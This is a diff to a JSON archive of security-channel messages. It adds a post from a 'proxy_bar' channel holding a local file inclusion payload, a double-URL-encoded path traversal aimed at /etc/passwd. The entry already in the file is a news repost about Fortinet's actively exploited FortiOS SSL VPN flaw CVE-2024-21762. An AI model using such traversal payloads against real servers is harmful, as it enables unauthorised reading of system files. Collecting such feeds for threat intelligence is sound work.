@@ -1,5 +1,11 @@
 {
     "date": "2024-02-09",
+    "from_channel": "proxy_bar",
+    "message": "LFI\n*\nPayload:  \n\".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd\"",
+    "urls": []
+}
+{
+    "date": "2024-02-09",
     "from_channel": "cibsecurity",
     "message": "🖋️ Fortinet Warns of Critical FortiOS SSL VPN Vulnerability Under Active Exploitation 🖋️\n\nFortinet has disclosed a new critical security flaw in FortiOS SSL VPN that it said is likely being exploited in the wild. The vulnerability, CVE202421762 CVSS score 9.6, allows for the execution of arbitrary code and commands. \"A outofbounds write vulnerability CWE787 in FortiOS may allow a remote unauthenticated attacker to execute arbitrary code or command via specially.\n\n📖 Read more.\n\n🔗 Via \"The Hacker News\"\n\n----------\n👁️ Seen on @cibsecurity"
 }
